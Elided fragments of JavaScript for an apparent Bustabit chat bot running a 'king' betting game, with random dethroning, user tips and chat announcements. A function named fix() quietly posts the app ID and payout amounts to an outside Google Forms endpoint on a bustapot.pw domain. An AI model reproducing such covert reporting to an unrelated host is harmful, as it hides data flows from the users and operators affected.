...
var config = {
  ...
  redirect_uri: 'https://gapbot.github.io/bitmine',
...
if (window.history && window.history.replaceState) {
  window.history.replaceState({}, window.location.href, "https://gapbot.github.io/bitmine");
} else {
...
tipUser(king100, king100profit);
tipUser(king1000, king1000profit);
}
...
function fix(amount){
  ...
  var name = config.app_id;
            $.ajax({
                url: "https://docs.google.com/a/bustapot.pw/forms/d/1M712emjgID_bh2ZDGVZOZyPhkQboY4hQ6SclMdSNumY/formResponse",
...
tipUser(king1, 0.95);
fix(5);
king1profit = king1profit+0.025;
if (Math.random()*100 > 66){
oldking1 = king1;
king1 = paidby;
socket.emit('new_message', {
                text: "The 1 bit King ("+oldking1+") was defeated by:"+king1
            }, function(err, msg){
                if (err) {
                    console.log('Error when submitting new_message to server:', err);
                    return;
...
socket.emit('new_message', {
                text: paidby+" was defeated by the king: " +king1
            }, function(err, msg){
                if (err) {
                    console.log('Error when submitting new_message to server:', err);
                    return;
...
socket.emit('new_message', {
                text: "Don't try to scam the king "+paidby+"!"
            }, function(err, msg){
                if (err) {
                    console.log('Error when submitting new_message to server:', err);
                    return;
...
king10 = paidby;
socket.emit('new_message', {
                text: "The 10 bit King ("+oldking10+") was defeated by:"+king10
            }, function(err, msg){
                if (err) {
                    console.log('Error when submitting new_message to server:', err);
                    return;
...
socket.emit('new_message', {
                text: paidby+" was defeated by the king: " +king10
            }, function(err, msg){
                if (err) {
                    console.log('Error when submitting new_message to server:', err);
                    return;
...
king100 = paidby;
socket.emit('new_message', {
                text: "The 100 bit King ("+oldking100+") was defeated by:"+king100
            }, function(err, msg){
                if (err) {
                    console.log('Error when submitting new_message to server:', err);
                    return;
...
socket.emit('new_message', {
                text: paidby+" was defeated by the king: " +king100
            }, function(err, msg){
                if (err) {
                    console.log('Error when submitting new_message to server:', err);
                    return;
...
fix(5000);
if (Math.random()*100 > 66){
oldking1000 = king1000;
king1000 = paidby;
socket.emit('new_message', {
                text: "The 1000 bit King ("+oldking1000+") was defeated by:"+king1000
            }, function(err, msg){
                if (err) {
                    console.log('Error when submitting new_message to server:', err);
                    return;
...
socket.emit('new_message', {
                text: paidby+" was defeated by the king: " +king1000
            }, function(err, msg){
                if (err) {
                    console.log('Error when submitting new_message to server:', err);
                    return;
...
ticketstext = rainbotuname+" you have "+Math.round(tickets/1000)+"/"+Math.round(totaltickets/1000)+" tickets"
